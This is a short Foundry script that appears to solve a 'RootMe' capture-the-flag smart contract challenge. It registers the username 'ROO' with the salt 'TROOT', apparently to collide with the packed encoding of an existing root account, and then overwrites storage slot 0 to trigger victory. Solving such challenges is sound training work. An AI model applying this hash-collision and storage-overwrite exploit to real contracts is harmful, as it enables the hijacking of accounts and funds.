// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/RootMe.sol";

contract RootMeScript is Script {
    address instanceAddress = 0x923ab762D1345DA6A5f91382C5bCa64E997c7d8A; // Hardcoded, put your instance address plz
    RootMe target;

    function setUp() public {
        target = RootMe(instanceAddress);
        vm.label(address(target), "Target");
    }

    function run() public {
        vm.startBroadcast();

        target.register("ROO", "TROOT");
        target.write(bytes32(0), bytes32(abi.encodePacked(uint256(1))));

        require(target.victory(), "Challenge incomplete");

        vm.stopBroadcast();
    }
}
